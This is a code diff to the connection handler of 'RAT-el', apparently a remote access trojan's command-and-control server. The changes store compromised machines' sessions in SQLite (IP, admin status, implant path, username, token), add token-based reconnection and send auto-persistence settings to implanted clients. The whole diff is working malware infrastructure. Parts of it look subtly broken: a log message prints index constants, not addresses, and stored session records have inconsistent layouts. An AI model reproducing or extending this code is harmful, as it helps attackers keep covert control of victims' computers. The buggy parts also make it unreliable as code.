@@ -5,11 +5,14 @@ import socket
 import os
 import binascii
 from .other import printColor
+from .sql import Sql
+from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN
+
 
 
 class Handler(threading.Thread):
     #Manage incoming connections with a thread system
-    dict_conn={}# dict = tuple | dict = socket,address  Stores all socket, ip, port and connection health status.
+    dict_conn={}# dict of list | dict = socket,address  Stores all socket, ip, port and connection health status.
     number_conn=0  #count number of connexions
     status_connection_display = True 
     start_handler = False
@@ -17,7 +20,7 @@ class Handler(threading.Thread):
 #    ptable = PrettyTable() #Ascii tables dynamic.
 #    ptable.field_names =["Session","IP","Port","Is he alive"] #append title of row.
 
-    def __init__(self,host,port,display,auto_persistence):
+    def __init__(self,host,port,display,auto_persistence, ObjSql):
 
         threading.Thread.__init__(self)
         self.port = port 
@@ -25,13 +28,52 @@ class Handler(threading.Thread):
         self.sock_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.display = display
         self.auto_persistence = auto_persistence
-    
+        self.ObjSql = ObjSql
+        self.initialization()
+
+    def initialization(self):
+        """
+        filled in the dictionary dict_conn via the database.
+        All sockets are equal to False because once the server is down it is complicated to save an object (socket).
+        (The socket is not saved by default in the database).
+        """
+        self.ObjSql.createDb()
+        list_of_rows = self.ObjSql.selectAll()
+
+        if(bool(list_of_rows)): #verify if the list is empty
+            for row in range(len(list_of_rows)):
+                session = list_of_rows[row][0]
+                sock = False #
+                ip = list_of_rows[row][1]
+                port =  False
+                is_he_alive = False
+                is_he_admin = self.ObjSql.setTrueOrFalse(list_of_rows[row][4])
+                path_rat = list_of_rows[row][5]
+                usename = list_of_rows[row][6]
+                token = list_of_rows[row][7]
+
+                #print("---> ",session, ip, port, is_he_alive, is_he_admin, path_rat, usename, token)
+
+                Handler.dict_conn[session] = [session, False, ip, port, is_he_alive, is_he_admin, path_rat, usename, token]
+       
+                Handler.number_conn = self.ObjSql.returnLastSession() + 1 #ok
+                #print(Handler.number_conn) ok
+                #print("type of dict_conn ----->",type(Handler.dict_conn[0])) ok
+                #print(Handler.dict_conn)
+
+
+        else:
+            print("[?] NOT Value in database.")
+            pass
+            
+
     def SuccessfullyQuit(self):
         try:
             print("\n")
             for key,value in Handler.dict_conn.items():
-                value[0].close()
-                printColor("error","[-] {}:{} Connection closed.".format(value[1],value[2]))
+                if(value[NB_ALIVE]):
+                    value[0].close()
+                    printColor("error","[-] {}:{} Connection closed.".format(NB_IP,NB_PORT))
                 
         except Exception  as e: 
             printColor("error","[-] Error closing a socket. Error: {}".format(e))
@@ -42,7 +84,7 @@ class Handler(threading.Thread):
     
     def run(self):
         Handler.status_connection_display = self.display
-        
+
         while True:
             #Test if the port listening is good.
             try:
@@ -79,12 +121,12 @@ Manual control allows to add crucial information like username, RAT and stores e
 The client first sends this information, then the server sends the parameters as auto persistence. 
 
     '''
-    def __init__(self,conn,address,auto_persistence):
+    def __init__(self, conn, address, auto_persistence):
         threading.Thread.__init__(self)
         self.conn = conn
         self.address = address
         self.auto_persistence = auto_persistence
-
+        self.ObjSql = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")
 
     def generateToken(self):
         return binascii.hexlify(os.urandom(24)).decode("utf8")
@@ -94,12 +136,12 @@ The client first sends this information, then the server sends the parameters as
         
         try:
             self.conn.send(data.encode())
-            print("[+] send: ",data)
+            #print("[+] send: ",data)
         except Exception as e:
             print(e)
         else:
             try:
-                print("EN ATTENTE dans la reponse de ultrasafe")
+               # print("EN ATTENTE dans la reponse de ultrasafe")
                 self.conn.settimeout(3)
                 confirmation = self.conn.recv(4096).decode("utf8")
             except Exception as e:
@@ -124,7 +166,7 @@ The client first sends this information, then the server sends the parameters as
             print("error 2021")
         else:   
             try:
-                print("SEND confirmation in recvultrasafe.")
+                #print("SEND confirmation in recvultrasafe.")
                 self.conn.send(b"confirmation")
             except Exception:
                 print("EXCEPTION in recvULTRASAFE CONFIRMATION")
@@ -144,21 +186,16 @@ The client first sends this information, then the server sends the parameters as
                 print("Stop recvFirstInfo")
                 break
             
-            if(data=="MOD_RECONNECT"):
-                print("IN MOD RECONNECT (recv Frist Info)")
+            if(data=="MOD_RECONNECT"): #A changer ! MOD_RECONNECT True | TOKEN fdsafafsdfsadf3454sdfasdf5
+                #print("IN MOD RECONNECT (recv Frist Info)")
                 token = self.recvUltraSafe()
                 if bool(Handler.dict_conn):
                     print(token)
                     for value in Handler.dict_conn.values():
-                        print(value[7])
-                        if(value[7] == token): 
+                        print(value[NB_TOKEN])
+                        if(value[NB_TOKEN] == token): 
                             print("Token doublon")
                             break
-                        else:
-                            end = self.recvUltraSafe()
-                            if(end == "\r\n"):
-                                print("End reconnexion.")
-                                break
 
                 else:
                     print("dict empty")
@@ -180,27 +217,29 @@ The client first sends this information, then the server sends the parameters as
             #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
 
         self.sendUltraSafe("MOD_HANDSHAKE_TOKEN | " + token)        
-        print("SEND TOKEN")
+        #print("SEND TOKEN")
         #time.sleep(0.3)
         self.sendUltraSafe("\r\n") #end echange.
-        print("FINISH")
+        print("FINISH handshake")
 
 
     def run(self):
-        
-        
+
+        self.ObjSql.createDb()
         list_info = self.recvFirstInfo() #Collect informations with Handshake client. #1
         if(bool(list_info)):
             #print("sencode part persi go !!!! ")
             token = self.generateToken()
             self.sendParameterOfClient(token) #2
+
+            if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
+                self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, list_info[0], list_info[1], list_info[2],token)
+                #print("IP IN DATABASE IS: ", self.ObjSql.returnValue(Handler.number_conn, "socket"))
+
+            Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, list_info[0], list_info[1], list_info[2]] #3 #True = Connexion is life 
+            Handler.number_conn+=1 #4
+            #print("type of dict_conn ----->",type(Handler.dict_conn))
         else:
             #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
             pass 
 
-        if(bool(list_info)):       
-            Handler.dict_conn[Handler.number_conn] = [self.conn, self.address[0],self.address[1], True, list_info[0], list_info[1], list_info[2]] #3 #True = Connexion is life 
-            Handler.number_conn+=1 #4
-        else:
-            #if empty, ignore.
-            pass 
